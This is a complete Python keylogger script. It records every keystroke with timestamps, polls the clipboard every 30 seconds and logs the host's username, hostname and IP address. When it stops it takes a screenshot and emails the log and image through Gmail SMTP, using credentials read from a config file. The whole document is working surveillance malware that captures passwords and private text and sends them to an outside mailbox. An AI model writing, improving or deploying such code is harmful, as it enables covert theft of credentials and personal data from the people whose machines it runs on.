from pynput import keyboard
import time
import os
import threading
import pyperclip
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import socket
import getpass
from PIL import ImageGrab

# === Configuration ===
log_file = "key_log.txt"
log_path = os.path.abspath(log_file)
clipboard_interval = 30
auto_stop_after = 0
send_email_on_stop = True
take_screenshot_on_stop = True
config_file = "config.txt"

# === Load config (sender_email, app_password, receiver_email) ===
sender_email = None
app_password = None
receiver_email = None

try:
    with open(config_file, "r") as cfg:
        sender_email = cfg.readline().strip()
        app_password = cfg.readline().strip()
        receiver_email = cfg.readline().strip()
except Exception as e:
    print(" Failed to load config.txt:", e)

# === Log Startup ===
print("Keylogger started.")
print(f"Log file: {log_path}")
print("press ESC to stop.\n")

log = open(log_path, "a", buffering=1)
log.write(f"\n\n=== Logging started at {time.ctime()} ===\n")

# Device Info
hostname = socket.gethostname()
username = getpass.getuser()
ip = socket.gethostbyname(hostname)
device_info = f"{username}@{hostname} ({ip})"
log.write(f"Device: {device_info}\n")

# === Grouping Keys ===
last_time = ""
current_line = ""

from pynput.keyboard import Key, KeyCode

from pynput.keyboard import Key, KeyCode

def format_key(key):
    if isinstance(key, KeyCode):
        try:
            if key.char:
                return key.char  # This will directly log '1', '2', 'a', etc.
            else:
                return ''
        except AttributeError:
            return ''
    elif isinstance(key, Key):
        special_keys = {
            Key.space: ' ',
            Key.enter: '[ENTER]',
            Key.tab: '[TAB]',
            Key.backspace: '[BACKSPACE]',
            Key.esc: '[ESC]',
            Key.shift: '[SHIFT]',
            Key.shift_r: '[SHIFT_R]',
            Key.ctrl_l: '[CTRL]',
            Key.ctrl_r: '[CTRL_R]',
            Key.alt_l: '[ALT]',
            Key.alt_r: '[ALT_R]',
            Key.caps_lock: '[CAPSLOCK]',
            Key.cmd: '[CMD]',
            Key.delete: '[DEL]',
            Key.up: '[UP]',
            Key.down: '[DOWN]',
            Key.left: '[LEFT]',
            Key.right: '[RIGHT]',
        }
        return special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")
    else:
        return ''



def write_line(timestamp, text):
    if text.strip() != "":
        log.write(f"{timestamp} - {text.strip()}\n")

def clipboard_logger():
    last_clip = ""
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                last_clip = current_clip
                timestamp = time.strftime('%H:%M:%S')
                log.write(f"{timestamp} - [CLIPBOARD] {current_clip}\n")
        except Exception:
            pass
        time.sleep(clipboard_interval)

def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
    except:
        pass

def send_log_email():
    if not sender_email or not app_password or not receiver_email:
        print(" Email not configured properly. Skipping email send.")
        return

    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = f"Keylogger Log from {device_info}"

        msg.attach(MIMEText(f"Attached log from: {device_info}\nTime: {time.ctime()}", 'plain'))

        # Attach log file
        with open(log_file, "rb") as f:
            part = MIMEApplication(f.read(), Name=log_file)
            part['Content-Disposition'] = f'attachment; filename="{log_file}"'
            msg.attach(part)

        # Attach screenshot if exists
        if take_screenshot_on_stop and os.path.exists("screenshot.png"):
            with open("screenshot.png", "rb") as img_file:
                img_part = MIMEApplication(img_file.read(), Name="screenshot.png")
                img_part['Content-Disposition'] = 'attachment; filename="screenshot.png"'
                msg.attach(img_part)

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, app_password)
            server.send_message(msg)

        print(" Email sent successfully.")
    except Exception as e:
        print("❌ Email sending failed:", e)

def stop_logger():
    log.write(f"=== Logging stopped at {time.ctime()} ===\n")
    log.close()
    if take_screenshot_on_stop:
        take_screenshot()
    if send_email_on_stop:
        send_log_email()
    print("Keylogger stopped.")
    os._exit(0)

def auto_stop_timer():
    if auto_stop_after > 0:
        time.sleep(auto_stop_after)
        stop_logger()

def on_press(key):
    global last_time, current_line
    now = time.strftime('%H:%M:%S')
    key_text = format_key(key)

    if key_text in ['[ENTER]', '[TAB]', '[BACKSPACE]', '[ESC]']:
        if current_line:
            write_line(last_time, current_line)
            current_line = ""
        write_line(now, key_text)
        if key_text == '[ESC]':
            stop_logger()
            return False
    else:
        if now == last_time:
            current_line += key_text
        else:
            if current_line:
                write_line(last_time, current_line)
            last_time = now
            current_line = key_text

# === Threads ===
threading.Thread(target=clipboard_logger, daemon=True).start()
threading.Thread(target=auto_stop_timer, daemon=True).start()

# === Key Listener ===
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
